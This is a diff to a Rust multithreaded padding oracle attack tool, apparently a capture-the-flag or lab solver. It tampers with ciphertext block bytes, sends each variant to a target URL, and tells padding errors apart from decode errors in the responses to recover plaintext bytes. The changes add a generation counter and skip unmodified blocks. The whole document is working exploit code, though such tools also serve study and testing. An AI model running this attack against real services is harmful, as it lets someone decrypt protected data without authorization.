@@ -74,7 +74,7 @@ fn main() -> Result<()> {
         return Ok(());
     }
 
-    let mut client = Arc::new(Client::new());
+    let client = Arc::new(Client::new());
     let mut chunks: Vec<Vec<u8>> = BASE64_STANDARD
         .decode(
             args.base64
@@ -96,10 +96,12 @@ fn main() -> Result<()> {
     let url = Arc::new(args.url.clone());
     let finished_condvar = Arc::new(Condvar::new());
     let finished_b: Arc<Mutex<Option<u8>>> = Arc::new(Mutex::new(None));
+    let generation = Arc::new(Mutex::new(1u8));
     for chunk in 2..=10 {
         let mut intermediates = [0u8; 16];
         chunks = orig_chunks.clone();
         for i in 1u8..=16 {
+            *(generation.lock().unwrap()) = i;
             println!("chunk: #{}", len - chunk);
             println!("i: {i}");
             let mut handles = vec![];
@@ -111,10 +113,12 @@ fn main() -> Result<()> {
                 let semaphore = semaphore.clone();
                 let finished_condvar = finished_condvar.clone();
                 let finished_b = finished_b.clone();
+                let generation = generation.clone();
+
                 let handle = std::thread::spawn(move || {
-                    {
-                        let second_last = chunks.get_mut(len - chunk).unwrap();
-                        second_last[16 - i as usize] = b;
+                    chunks[len - chunk][16 - i as usize] = b;
+                    if chunks[len - chunk] == orig_chunks[len - chunk] {
+                        return;
                     }
                     // println!(
                     //     "{:x?}",
@@ -145,18 +149,25 @@ fn main() -> Result<()> {
                         .send()
                         .unwrap();
                     drop(guard);
+                    if *(generation.lock().unwrap()) != i {
+                        return;
+                    }
                     let text = res.text().unwrap();
                     if text.contains("PaddingException") {
                         print!("{b} ");
                         io::stdout().flush().unwrap();
                     } else {
                         println!("\n{b} {text}");
-                        if text.contains("UnicodeDecodeError") || text.contains("ValueError") {
+                        if text.contains("UnicodeDecodeError")
+                            || text.contains("ValueError")
+                            || i != 1
+                        {
                             *(finished_b.lock().unwrap()) = Some(b);
                             finished_condvar.notify_one();
                         }
                     }
                 });
+
                 handles.push(handle);
             }
 
